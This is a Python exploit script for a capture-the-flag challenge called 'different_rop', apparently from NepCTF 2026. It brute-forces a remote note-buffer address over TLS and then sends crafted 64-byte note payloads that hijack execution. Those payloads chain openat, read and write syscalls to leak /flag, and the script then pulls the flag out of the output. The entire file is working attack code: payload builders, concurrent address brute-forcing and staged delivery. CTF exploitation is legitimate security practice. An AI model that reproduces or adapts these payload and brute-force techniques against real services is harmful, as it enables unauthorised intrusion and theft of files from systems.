#!/usr/bin/env python3
"""
Remote exploit for different_rop - NepCTF 2026.
Auto-detects remote note buffer base via brute-force, then runs 3-stage exploit.

Usage: python3 exp_remote_final.py
"""
import socket, ssl, struct, time, concurrent.futures, sys

HOST = "sbyyhw2d-zk83-qkgo-oxbg-6a5ad97d32521-neptune.nepctf.com"
PORT = 443
TRAP0 = 0x2ba08; RESTART = 0x21168
SYS_OPENAT=56; SYS_READ=63; SYS_WRITE=64
AT_FDCWD = 0xFFFFFF9C; BSS_BUF = 0x4bd88

def build_note1(base):
    """Stage 1: openat with restart."""
    note = bytearray(64)
    struct.pack_into('<I', note, 4, 0); struct.pack_into('<I', note, 8, 0)
    struct.pack_into('<I', note, 12, 0); struct.pack_into('<I', note, 16, 0)
    struct.pack_into('<I', note, 20, base + 32); struct.pack_into('<I', note, 24, AT_FDCWD)
    struct.pack_into('<I', note, 28, SYS_OPENAT)
    note[32:38] = b'/flag\x00'
    struct.pack_into('<I', note, 48, base + 56); struct.pack_into('<I', note, 52, TRAP0)
    struct.pack_into('<I', note, 56, base + 56); struct.pack_into('<I', note, 60, RESTART)
    return note

def build_note(base, sysno, r0, r1, r2):
    """Generic note for read/write with restart."""
    note = bytearray(64)
    struct.pack_into('<I', note, 4, 0); struct.pack_into('<I', note, 8, 0)
    struct.pack_into('<I', note, 12, 0); struct.pack_into('<I', note, 16, r2)
    struct.pack_into('<I', note, 20, r1); struct.pack_into('<I', note, 24, r0)
    struct.pack_into('<I', note, 28, sysno)
    struct.pack_into('<I', note, 48, base + 56); struct.pack_into('<I', note, 52, TRAP0)
    struct.pack_into('<I', note, 56, base + 56); struct.pack_into('<I', note, 60, RESTART)
    return note

def test_base_test(base):
    """Test if openat+restart works for given note base."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        ssock = ctx.wrap_socket(sock, server_hostname=HOST)
        ssock.connect((HOST, PORT))
        data = b''
        ssock.settimeout(2)
        while b'> ' not in data:
            try: data += ssock.recv(4096)
            except: break
        ssock.send(b'3\n' + bytes(build_note1(base)) + b'\n')
        data = b''
        ssock.settimeout(3)
        while True:
            try:
                chunk = ssock.recv(4096)
                if not chunk: break
                data += chunk
                if b'ROP Register Lab' in data:
                    ssock.close()
                    return True
            except: break
        ssock.close()
        return False
    except:
        return False

def find_base():
    """Brute-force the remote note buffer base."""
    # Generate candidate bases from all known QEMU configs + margins
    known_configs = [
        # (note_base, description)
        (0x4080e4c0, "default"),
        (0x4020e4b0, "STACK_SIZE"),
        (0x4080e4a0, "RVA=0xC0000000"),
        (0x15d6e4a0, "RVA=0x40000000"),
        (0x0b2be4a0, "RVA=0x20000000"),
        (0x05d6e4a0, "RVA=0x10000000"),
        (0x032be4a0, "RVA=0x8000000"),
        (0x00d6e4a0, "RVA=0x1000000"),
        (0x1080e4a0, "RVA=0x30000000"),
        (0x0180e4a0, "RVA=0x3000000"),
        (0x022be4a0, "RVA=0x5000000"),
        (0x0280e4a0, "RVA=0x6000000"),
        (0x02d6e4a0, "RVA=0x7000000"),
        (0x0380e4a0, "RVA=0x9000000"),
        (0x03d6e4a0, "RVA=0xA000000"),
        (0x042be4a0, "RVA=0xB000000"),
        (0x0480e4a0, "RVA=0xC000000"),
        (0x04d6e4a0, "RVA=0xD000000"),
        (0x052be4a0, "RVA=0xE000000"),
        (0x0580e4a0, "RVA=0xF000000"),
        (0x0880e4a0, "RVA=0x18000000"),
        (0x0dd6e4a0, "RVA=0x28000000"),
        (0x132be4a0, "RVA=0x38000000"),
    ]

    candidates = []
    for base, desc in known_configs:
        # Try ±0x400 around each base in 0x10 steps
        for off in range(-0x400, 0x400, 0x10):
            candidates.append((base + off, desc))

    # Dedup
    seen = set()
    unique = []
    for b, d in candidates:
        if b not in seen:
            seen.add(b)
            unique.append((b, d))

    print(f"[*] Testing {len(unique)} candidates...")

    found = None
    for i in range(0, len(unique), 8):
        batch = unique[i:i+8]
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            futures = {executor.submit(test_base_test, b): (b, d) for b, d in batch}
            for f in concurrent.futures.as_completed(futures):
                if f.result():
                    base, desc = futures[f]
                    print(f"\n*** FOUND! Remote base = 0x{base:08x} ({desc}) ***")
                    found = base
                    break
        if found:
            break
        if i % 800 == 0:
            print(f"  [{i}/{len(unique)}] current: 0x{batch[-1][0]:08x}")

    return found

def run_exploit(base):
    """Run full 3-stage exploit with known base."""
    # b2, b3 are shifted by -0x80 each restart
    b1, b2, b3 = base, base - 0x80, base - 0x100

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    ssock = ctx.wrap_socket(sock, server_hostname=HOST)
    ssock.connect((HOST, PORT))

    def recv_until(marker, timeout=5):
        data = b''
        ssock.settimeout(timeout)
        while marker not in data:
            try:
                chunk = ssock.recv(4096)
                if not chunk: break
                data += chunk
            except: break
        return data

    # Read menu
    recv_until(b'> ')

    # Stage 1: openat
    print("[*] Stage 1: openat('/flag')")
    ssock.send(b'3\n' + bytes(build_note1(b1)) + b'\n')
    recv_until(b'ROP Register Lab', timeout=8)
    recv_until(b'> ')

    # Stage 2: read(3, BSS, 0x100)
    print("[*] Stage 2: read(3, BSS, 0x100)")
    ssock.send(b'3\n' + bytes(build_note(b2, SYS_READ, 3, BSS_BUF, 0x100)) + b'\n')
    recv_until(b'ROP Register Lab', timeout=8)
    recv_until(b'> ')

    # Stage 3: write(1, BSS, 0x100)
    print("[*] Stage 3: write(1, BSS, 0x100)")
    ssock.send(b'3\n' + bytes(build_note(b3, SYS_WRITE, 1, BSS_BUF, 0x100)) + b'\n')

    time.sleep(1)
    data = b''
    try:
        ssock.settimeout(5)
        while True:
            chunk = ssock.recv(4096)
            if not chunk: break
            data += chunk
    except: pass

    ssock.close()
    return data

# ---- Main ----
if len(sys.argv) > 1:
    # Manual base provided
    base = int(sys.argv[1], 16)
    print(f"[*] Using provided base: 0x{base:08x}")
else:
    print("[*] Auto-detecting remote base...")
    base = find_base()

if base:
    print(f"\n[*] Running exploit with base 0x{base:08x}")
    output = run_exploit(base)
    text = output.decode(errors='replace')
    print(f"\n=== OUTPUT ({len(text)} bytes) ===")
    print(text[-2000:])

    # Extract flag
    import re
    for pattern in [r'[a-zA-Z0-9_]{10,40}', r'flag\{[^}]+\}']:
        for m in re.finditer(pattern, text):
            s = m.group()
            if '_' in s and not s.startswith('_'):
                print(f"\n*** FLAG: {s} ***")
else:
    print("\n[*] Could not find base. Try manual: python3 exp_remote_final.py 0x4080e4c0")
